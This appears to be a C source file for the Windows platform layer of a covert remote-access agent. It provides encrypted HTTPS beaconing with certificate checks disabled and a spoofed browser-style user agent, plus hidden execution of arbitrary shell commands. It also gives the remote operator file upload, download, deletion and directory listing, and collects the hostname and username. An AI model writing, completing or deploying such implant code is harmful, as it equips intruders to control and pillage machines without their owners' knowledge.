#include "port.h"

#include <windows.h>
#include <bcrypt.h>
#include <winhttp.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

int sys_init(void) { return 0; }
void sys_shutdown(void) {}

/* Explorer/Task Manager read the version resource compiled into the exe. */
void sys_set_procname(const char *name) { (void)name; }

void rand_bytes(unsigned char *out, size_t n) {
    typedef BOOLEAN(WINAPI * rtlgenrandom_fn)(unsigned char *, unsigned long);
    if (BCryptGenRandom(NULL, out, (ULONG)n, BCRYPT_USE_SYSTEM_PREFERRED_RNG) == 0) {
        return;
    }
    {
        HMODULE mod = GetModuleHandleA("advapi32.dll");
        rtlgenrandom_fn fn = (rtlgenrandom_fn)GetProcAddress(mod, "SystemFunction036");
        if (fn && fn(out, (unsigned long)n)) return;
    }
    exit(1);
}

int sha256(const unsigned char *in, size_t n, unsigned char out[32]) {
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_HASH_HANDLE hash = NULL;
    NTSTATUS st = BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    if (st != 0) return -1;
    st = BCryptCreateHash(alg, &hash, NULL, 0, NULL, 0, 0);
    if (st == 0) st = BCryptHashData(hash, (PUCHAR)in, (ULONG)n, 0);
    if (st == 0) st = BCryptFinishHash(hash, out, 32, 0);
    if (hash) BCryptDestroyHash(hash);
    BCryptCloseAlgorithmProvider(alg, 0);
    return st == 0 ? 0 : -1;
}

static int gcm_crypt(int encrypt, const unsigned char key[32], const unsigned char nonce[12],
                     const unsigned char *in, size_t in_len,
                     unsigned char *out, size_t out_len, unsigned char tag[16]) {
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE k = NULL;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    NTSTATUS st;
    ULONG done = 0;
    int ok = 0;

    st = BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (st != 0) return -1;
    st = BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                           sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (st != 0) goto done;
    st = BCryptGenerateSymmetricKey(alg, &k, NULL, 0, (PUCHAR)key, 32, 0);
    if (st != 0) goto done;

    memset(&info, 0, sizeof info);
    info.cbSize = sizeof info;
    info.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
    info.pbNonce = (PUCHAR)nonce;
    info.cbNonce = 12;
    info.pbTag = tag;
    info.cbTag = 16;

    if (encrypt) {
        st = BCryptEncrypt(k, (PUCHAR)in, (ULONG)in_len, &info, NULL, 0,
                           out, (ULONG)out_len, &done, 0);
    } else {
        st = BCryptDecrypt(k, (PUCHAR)in, (ULONG)in_len, &info, NULL, 0,
                           out, (ULONG)out_len, &done, 0);
    }
    if (st == 0 && done == (ULONG)in_len) ok = 1;
done:
    if (k) BCryptDestroyKey(k);
    BCryptCloseAlgorithmProvider(alg, 0);
    return ok ? 0 : -1;
}

int aes_gcm_seal(const unsigned char key[32], const unsigned char nonce[12],
                 const unsigned char *pt, size_t pt_len,
                 unsigned char *ct, size_t ct_len, unsigned char tag[16]) {
    return gcm_crypt(1, key, nonce, pt, pt_len, ct, ct_len, tag);
}

int aes_gcm_open(const unsigned char key[32], const unsigned char nonce[12],
                 const unsigned char *ct, size_t ct_len, const unsigned char tag[16],
                 unsigned char *pt, size_t pt_len) {
    return gcm_crypt(0, key, nonce, ct, ct_len, pt, pt_len, (unsigned char *)tag);
}

uint64_t now_unix(void) { return (uint64_t)_time64(NULL); }

void sleep_sec(double s) {
    if (s < 0) s = 0;
    Sleep((DWORD)(s * 1000.0));
}

static wchar_t *to_wide(const char *s) {
    int n = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    wchar_t *w;
    if (n <= 0) return NULL;
    w = (wchar_t *)malloc((size_t)n * sizeof(wchar_t));
    if (!w) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, s, -1, w, n);
    return w;
}

int http_post(const char *url, const char *ua, const char *body, size_t body_len,
              long *status_code, char **resp, size_t *resp_len) {
    wchar_t *wide_url = NULL, *wide_ua = NULL;
    URL_COMPONENTSW parts;
    HINTERNET session = NULL, connect = NULL, request = NULL;
    wchar_t host[256], path[512];
    DWORD status = 0, status_size = sizeof status, downloaded = 0, total = 0;
    char *buf = NULL;
    int ret = -1;

    wide_url = to_wide(url);
    wide_ua = to_wide(ua);
    if (!wide_url || !wide_ua) goto done;

    ZeroMemory(&parts, sizeof parts);
    parts.dwStructSize = sizeof parts;
    parts.lpszHostName = host;
    parts.dwHostNameLength = 255;
    parts.lpszUrlPath = path;
    parts.dwUrlPathLength = 511;
    if (!WinHttpCrackUrl(wide_url, 0, 0, &parts)) goto done;

    session = WinHttpOpen(wide_ua, WINHTTP_ACCESS_TYPE_NO_PROXY,
                          WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) goto done;
    WinHttpSetTimeouts(session, 15000, 15000, 30000, 30000);
    connect = WinHttpConnect(session, parts.lpszHostName, parts.nPort, 0);
    if (!connect) goto done;
    request = WinHttpOpenRequest(connect, L"POST", parts.lpszUrlPath, NULL,
                                 WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                 WINHTTP_FLAG_SECURE);
    if (!request) goto done;
    {
        static const wchar_t headers[] =
            L"Content-Type: application/json\r\n"
            L"Accept: application/json\r\n"
            L"Accept-Language: en-US,en\r\n";
        WinHttpAddRequestHeaders(request, headers, (DWORD)-1, 0);
    }
    {
        /* Cert validation is intentionally lenient: the AEAD key authenticates
           the server. Retry-once covers stacks that ignore a pre-send flag. */
        DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                      SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof flags);
    }
    if (!WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            (LPVOID)body, (DWORD)body_len, (DWORD)body_len, 0)) {
        DWORD err = GetLastError();
        if (err != ERROR_WINHTTP_SECURE_FAILURE) goto done;
        {
            DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
            if (!WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof flags)) goto done;
            if (!WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    (LPVOID)body, (DWORD)body_len, (DWORD)body_len, 0)) goto done;
        }
    }
    if (!WinHttpReceiveResponse(request, NULL)) goto done;
    if (!WinHttpQueryHeaders(request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                             WINHTTP_HEADER_NAME_BY_INDEX, &status, &status_size,
                             WINHTTP_NO_HEADER_INDEX)) goto done;

    buf = (char *)malloc(8192);
    if (!buf) goto done;
    for (;;) {
        DWORD avail = 0;
        if (total >= (size_t)RESP_MAX_BODY) break;
        if (!WinHttpQueryDataAvailable(request, &avail) || avail == 0) break;
        if ((size_t)avail > (size_t)RESP_MAX_BODY - total) avail = (DWORD)((size_t)RESP_MAX_BODY - total);
        {
            char *grown = (char *)realloc(buf, total + avail);
            if (!grown) break;
            buf = grown;
        }
        if (!WinHttpReadData(request, buf + total, avail, &downloaded)) break;
        if (downloaded == 0) break;
        total += downloaded;
        if (total > RESP_MAX_BODY) break;
    }
    ret = 0;
done:
    if (request) WinHttpCloseHandle(request);
    if (connect) WinHttpCloseHandle(connect);
    if (session) WinHttpCloseHandle(session);
    free(wide_url);
    free(wide_ua);
    if (ret == 0) {
        if (!buf) {
            buf = (char *)malloc(1);
            total = 0;
            if (!buf) return -1;
        }
        *status_code = (long)status;
        *resp = buf;
        *resp_len = total;
        return 0;
    }
    free(buf);
    return -1;
}

static void stop_tree(HANDLE job, HANDLE process) {
    if (job) TerminateJobObject(job, 1);
    else if (process) TerminateProcess(process, 1);
}

int exec_cmd(const char *cmd, int timeout_sec, unsigned char **out, size_t *out_len, int *exit_code) {
    SECURITY_ATTRIBUTES sa;
    HANDLE rd = NULL, wr = NULL, job = NULL;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char *cmdline = (char *)malloc(strlen(cmd) + 32);
    unsigned char *buf = (unsigned char *)malloc(8192);
    size_t cap = 8192, len = 0;
    ULONGLONG deadline;

    *exit_code = -1;
    *out = (unsigned char *)malloc(1);
    *out_len = 0;
    if (*out) (*out)[0] = 0;
    if (!cmdline || !buf) {
        free(cmdline);
        free(buf);
        return 0;
    }
    job = CreateJobObjectA(NULL, NULL);
    if (job) {
        JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli;
        ZeroMemory(&jeli, sizeof jeli);
        jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
        if (!SetInformationJobObject(job, JobObjectExtendedLimitInformation, &jeli, sizeof jeli)) {
            CloseHandle(job);
            job = NULL;
        }
    }
    if (timeout_sec <= 0 || timeout_sec > 600) timeout_sec = 30;
    sprintf(cmdline, "cmd.exe /c %s", cmd);

    sa.nLength = sizeof sa;
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    if (!CreatePipe(&rd, &wr, &sa, 0)) {
        if (rd) CloseHandle(rd);
        if (wr) CloseHandle(wr);
        free(cmdline);
        free(buf);
        if (job) CloseHandle(job);
        return 0;
    }
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);

    ZeroMemory(&si, sizeof si);
    si.cb = sizeof si;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = wr;
    si.hStdError = wr;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    ZeroMemory(&pi, sizeof pi);
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(rd);
        CloseHandle(wr);
        free(cmdline);
        free(buf);
        if (job) CloseHandle(job);
        return 0;
    }
    if (job && !AssignProcessToJobObject(job, pi.hProcess)) {
        CloseHandle(job);
        job = NULL;
    }
    CloseHandle(wr); /* parent copy must be gone to observe EOF */
    deadline = GetTickCount64() + (ULONGLONG)timeout_sec * 1000;

    for (;;) {
        DWORD avail = 0, read_n = 0;
        if (!PeekNamedPipe(rd, NULL, 0, NULL, &avail, NULL)) break;
        if (avail > 0) {
            char *grown;
            size_t ncap;
            if (len >= (size_t)OUT_CAP) { stop_tree(job, pi.hProcess); break; }
            if ((size_t)avail > (size_t)OUT_CAP - len) avail = (DWORD)((size_t)OUT_CAP - len);
            ncap = cap;
            while (ncap < len + avail) {
                if (ncap > (size_t)OUT_CAP / 2) { ncap = (size_t)OUT_CAP + 1; break; }
                ncap *= 2;
            }
            if (ncap > cap) {
                grown = (char *)realloc(buf, ncap);
                if (!grown) break;
                buf = (unsigned char *)grown;
                cap = ncap;
            }
            if (cap <= len) { stop_tree(job, pi.hProcess); break; }
            if (!ReadFile(rd, buf + len, (DWORD)(cap - len), &read_n, NULL)) break;
            len += read_n;
            if (len >= (size_t)OUT_CAP) { stop_tree(job, pi.hProcess); break; }
            continue;
        }
        if (WaitForSingleObject(pi.hProcess, 100) == WAIT_OBJECT_0) {
            for (;;) { /* drain leftovers */
                DWORD a2 = 0;
                if (!PeekNamedPipe(rd, NULL, 0, NULL, &a2, NULL) || a2 == 0) break;
                if (len >= (size_t)OUT_CAP) break;
                if (len + a2 > cap) {
                    char *grown;
                    size_t ncap = cap;
                    while (len + a2 > ncap) {
                        if (ncap > (size_t)OUT_CAP) break;
                        ncap *= 2;
                    }
                    if (ncap > (size_t)OUT_CAP + 1) ncap = (size_t)OUT_CAP + 1;
                    if (ncap <= cap) break;
                    grown = (char *)realloc(buf, ncap);
                    if (!grown) goto finish;
                    buf = (unsigned char *)grown;
                    cap = ncap;
                }
                if (!ReadFile(rd, buf + len, (DWORD)(cap - len), &read_n, NULL) || read_n == 0) break;
                len += read_n;
                if (len >= (size_t)OUT_CAP) break;
            }
            break;
        }
        if (GetTickCount64() >= deadline) { stop_tree(job, pi.hProcess); break; }
    }
finish:
    WaitForSingleObject(pi.hProcess, 5000);
    {
        DWORD code = 0;
        if (GetExitCodeProcess(pi.hProcess, &code)) *exit_code = (int)code;
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(rd);
    if (job) CloseHandle(job);
    free(cmdline);
    free(*out);
    *out = buf;
    *out_len = len;
    return 0;
}

int read_file_chunk(const char *path, uint32_t offset, unsigned char **out, size_t *out_len, uint32_t *total, int *err_code) {
    HANDLE h;
    LARGE_INTEGER size, pos;
    unsigned char *buf;
    size_t want, got = 0;

    *out = NULL;
    *out_len = 0;
    *total = 0;
    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        DWORD e = GetLastError();
        *err_code = (e == ERROR_FILE_NOT_FOUND || e == ERROR_PATH_NOT_FOUND) ? 1 : 2;
        return 0;
    }
    if (GetFileType(h) != FILE_TYPE_DISK) {
        CloseHandle(h);
        *err_code = 2;
        return 0;
    }
    if (!GetFileSizeEx(h, &size) || size.QuadPart < 0) {
        CloseHandle(h);
        *err_code = 2;
        return 0;
    }
    if (size.QuadPart > FILE_MAX) {
        CloseHandle(h);
        *err_code = 3;
        return 0;
    }
    *total = (uint32_t)size.QuadPart;
    if (offset > *total) {
        CloseHandle(h);
        *err_code = 4;
        return 0;
    }
    if (offset == *total) {
        CloseHandle(h);
        *err_code = 0;
        return 0;
    }
    pos.QuadPart = (LONGLONG)offset;
    if (!SetFilePointerEx(h, pos, NULL, FILE_BEGIN)) {
        CloseHandle(h);
        *err_code = 2;
        return 0;
    }
    want = (size_t)FILE_CHUNK;
    if (want > *total - offset) want = *total - offset;
    buf = (unsigned char *)malloc(want ? want : 1);
    if (!buf) { CloseHandle(h); *err_code = 2; return 0; }
    while (got < want) {
        DWORD rd = 0;
        if (!ReadFile(h, buf + got, (DWORD)(want - got), &rd, NULL) || rd == 0) break;
        got += rd;
    }
    CloseHandle(h);
    if (got == 0 && want > 0) {
        free(buf);
        *err_code = 4;
        return 0;
    }
    *out = buf;
    *out_len = got;
    *err_code = 0;
    return 0;
}

static void put_u64le(unsigned char *p, uint64_t v) {
    int i;
    for (i = 0; i < 8; i++) p[i] = (unsigned char)(v >> (8 * i));
}

static void put_u16le(unsigned char *p, uint16_t v) {
    p[0] = (unsigned char)(v & 0xff);
    p[1] = (unsigned char)((v >> 8) & 0xff);
}

int list_dir(const char *path, unsigned char **out, size_t *out_len, int *err_code, int *truncated) {
    char *pattern;
    size_t pl;
    WIN32_FIND_DATAA fd;
    HANDLE h;
    unsigned char *buf;
    size_t len = 0;
    int trunc = 0;

    *out = NULL;
    *out_len = 0;
    *truncated = 0;
    if (!path || !path[0]) path = ".";
    pl = strlen(path);
    pattern = (char *)malloc(pl + 3);
    if (!pattern) {
        *err_code = 2;
        return 0;
    }
    memcpy(pattern, path, pl);
    if (pl && path[pl - 1] != '\\') pattern[pl++] = '\\';
    pattern[pl++] = '*';
    pattern[pl] = '\0';

    h = FindFirstFileA(pattern, &fd);
    free(pattern);
    if (h == INVALID_HANDLE_VALUE) {
        DWORD e = GetLastError();
        *err_code = (e == ERROR_FILE_NOT_FOUND || e == ERROR_PATH_NOT_FOUND) ? 1
                  : (e == ERROR_DIRECTORY ? 3 : 2);
        return 0;
    }
    buf = (unsigned char *)malloc(DIR_LIST_CAP);
    if (!buf) {
        FindClose(h);
        *err_code = 2;
        return 0;
    }
    do {
        const char *name = fd.cFileName;
        size_t nl = strlen(name), need;
        uint64_t size, mtime;
        ULARGE_INTEGER ft;

        if (nl == 1 && name[0] == '.') continue;
        if (nl == 2 && name[0] == '.' && name[1] == '.') continue;
        need = 1 + 8 + 8 + 2 + nl;
        if (len + need > DIR_LIST_CAP) {
            trunc = 1;
            break;
        }
        buf[len] = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 1 : 0;
        size = ((uint64_t)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
        ft.HighPart = fd.ftLastWriteTime.dwHighDateTime;
        ft.LowPart = fd.ftLastWriteTime.dwLowDateTime;
        mtime = ft.QuadPart >= 116444736000000000ULL
                    ? (ft.QuadPart - 116444736000000000ULL) / 10000000ULL
                    : 0;
        put_u64le(buf + len + 1, size);
        put_u64le(buf + len + 9, mtime);
        put_u16le(buf + len + 17, (uint16_t)nl);
        memcpy(buf + len + 19, name, nl);
        len += need;
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    *out = buf;
    *out_len = len;
    *truncated = trunc;
    *err_code = 0;
    return 0;
}

static int win_rm_tree(const char *path, int depth, int *err_code) {
    char *pattern;
    size_t pl;
    WIN32_FIND_DATAA fd;
    HANDLE h;
    DWORD attrs;
    int bad = 0;

    if (depth <= 0) { *err_code = 2; return -1; }
    pl = strlen(path);
    pattern = (char *)malloc(pl + 3);
    if (!pattern) { *err_code = 2; return -1; }
    memcpy(pattern, path, pl);
    if (pl && path[pl - 1] != '\\') pattern[pl++] = '\\';
    pattern[pl++] = '*';
    pattern[pl] = '\0';
    h = FindFirstFileA(pattern, &fd);
    free(pattern);
    if (h == INVALID_HANDLE_VALUE) {
        *err_code = 2;
        return -1;
    }
    do {
        const char *name = fd.cFileName;
        char *full;
        size_t nl = strlen(name), flen;
        int sub = 0;
        if (nl == 1 && name[0] == '.') continue;
        if (nl == 2 && name[0] == '.' && name[1] == '.') continue;
        full = (char *)malloc(pl + 1 + nl + 1);
        if (!full) { bad = 1; break; }
        memcpy(full, path, pl);
        if (pl && path[pl - 1] != '\\') full[pl++] = '\\';
        memcpy(full + pl, name, nl);
        flen = pl + nl;
        full[flen] = '\0';
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (win_rm_tree(full, depth - 1, &sub) != 0) bad = 1;
        } else if (DeleteFileA(full) == 0) {
            bad = 1;
        }
        free(full);
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    if (bad) {
        *err_code = 2;
        return -1;
    }
    if (!RemoveDirectoryA(path)) {
        *err_code = 2;
        return -1;
    }
    return 0;
}

int fs_rm(const char *path, int recursive, int *err_code) {
    DWORD attrs;
    if (!path || !path[0]) { *err_code = 2; return 0; }
    attrs = GetFileAttributesA(path);
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        DWORD e = GetLastError();
        *err_code = (e == ERROR_FILE_NOT_FOUND || e == ERROR_PATH_NOT_FOUND) ? 1 : 2;
        return 0;
    }
    if ((attrs & FILE_ATTRIBUTE_DIRECTORY) && !recursive) {
        *err_code = 6;
        return 0;
    }
    if (attrs & FILE_ATTRIBUTE_DIRECTORY) {
        if (win_rm_tree(path, 32, err_code) != 0) return 0;
        *err_code = 0;
        return 0;
    }
    if (!DeleteFileA(path)) {
        DWORD e = GetLastError();
        *err_code = (e == ERROR_FILE_NOT_FOUND) ? 1 : 2;
        return 0;
    }
    *err_code = 0;
    return 0;
}

int fs_mv(const char *src, const char *dst, int *err_code) {
    if (!src || !dst || !src[0] || !dst[0]) { *err_code = 2; return 0; }
    if (!MoveFileExA(src, dst, MOVEFILE_REPLACE_EXISTING)) {
        DWORD e = GetLastError();
        *err_code = (e == ERROR_FILE_NOT_FOUND || e == ERROR_PATH_NOT_FOUND) ? 1 : 2;
        return 0;
    }
    *err_code = 0;
    return 0;
}

int fs_mkdir(const char *path, int *err_code) {
    if (!path || !path[0]) { *err_code = 2; return 0; }
    if (!CreateDirectoryA(path, NULL)) {
        DWORD e = GetLastError();
        *err_code = e == ERROR_ALREADY_EXISTS ? 5 : (e == ERROR_PATH_NOT_FOUND ? 1 : 2);
        return 0;
    }
    *err_code = 0;
    return 0;
}

static int win_file_meta(const char *path, unsigned long long *size, unsigned long long *mtime) {
    HANDLE h;
    LARGE_INTEGER sz;
    FILETIME wt;

    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    if (!GetFileSizeEx(h, &sz) || !GetFileTime(h, NULL, NULL, &wt)) {
        CloseHandle(h);
        return 0;
    }
    CloseHandle(h);
    if (sz.QuadPart < 0) return 0;
    *size = (unsigned long long)sz.QuadPart;
    {
        ULARGE_INTEGER fti;
        fti.HighPart = wt.dwHighDateTime;
        fti.LowPart = wt.dwLowDateTime;
        *mtime = fti.QuadPart >= 116444736000000000ULL
                     ? (fti.QuadPart - 116444736000000000ULL) / 10000000ULL
                     : 0;
    }
    return 1;
}

int fs_write_chunk(const char *path, uint32_t offset, uint64_t total,
                   int64_t expect_size, int64_t expect_mtime, int force,
                   const unsigned char *data, size_t data_len, int *err_code) {
    char *tmp;
    size_t pl;
    HANDLE h;
    LARGE_INTEGER pos;
    unsigned long long size = 0, mtime = 0;
    int exists;

    if (!path || !path[0]) { *err_code = 2; return 0; }
    if (total > FILE_MAX) { *err_code = 3; return 0; }
    pl = strlen(path);
    tmp = (char *)malloc(pl + sizeof(WRITE_TMP));
    if (!tmp) { *err_code = 2; return 0; }
    memcpy(tmp, path, pl);
    memcpy(tmp + pl, WRITE_TMP, sizeof(WRITE_TMP));

    exists = win_file_meta(path, &size, &mtime);
    if (offset == 0) {
        if (exists && !force) {
            if (expect_size >= 0 && (unsigned long long)expect_size != size) {
                free(tmp);
                *err_code = 4;
                return 0;
            }
            if (expect_mtime >= 0 && (unsigned long long)expect_mtime != mtime) {
                free(tmp);
                *err_code = 4;
                return 0;
            }
        }
        h = CreateFileA(tmp, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (h == INVALID_HANDLE_VALUE) {
            free(tmp);
            *err_code = 2;
            return 0;
        }
        CloseHandle(h);
    }
    h = CreateFileA(tmp, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        free(tmp);
        *err_code = 2;
        return 0;
    }
    pos.QuadPart = (LONGLONG)offset;
    if (!SetFilePointerEx(h, pos, NULL, FILE_BEGIN)) {
        CloseHandle(h);
        free(tmp);
        *err_code = 2;
        return 0;
    }
    {
        size_t off = 0;
        while (off < data_len) {
            DWORD w = 0;
            if (!WriteFile(h, data + off, (DWORD)(data_len - off), &w, NULL) || w == 0) {
                CloseHandle(h);
                free(tmp);
                *err_code = 2;
                return 0;
            }
            off += w;
        }
    }
    CloseHandle(h);
    if ((uint64_t)offset + data_len >= total) {
        if (exists) {
            DWORD attrs = GetFileAttributesA(path);
            if (attrs != INVALID_FILE_ATTRIBUTES) SetFileAttributesA(tmp, attrs);
        }
        if (!MoveFileExA(tmp, path, MOVEFILE_REPLACE_EXISTING)) {
            free(tmp);
            *err_code = 2;
            return 0;
        }
    }
    free(tmp);
    *err_code = 0;
    return 0;
}

void host_info(char *hostname, size_t hn, char *username, size_t un,
               char *os, size_t on, char *arch, size_t an, uint32_t *pid) {
    DWORD n;
    SYSTEM_INFO si;

    n = (DWORD)hn;
    if (!GetComputerNameExA(ComputerNameDnsHostname, hostname, &n)) hostname[0] = '\0';
    n = (DWORD)un;
    if (!GetUserNameA(username, &n)) username[0] = '\0';
    snprintf(os, on, "windows");
    GetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) snprintf(arch, an, "amd64");
    else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) snprintf(arch, an, "arm64");
    else snprintf(arch, an, "unknown");
    *pid = (uint32_t)GetCurrentProcessId();
}
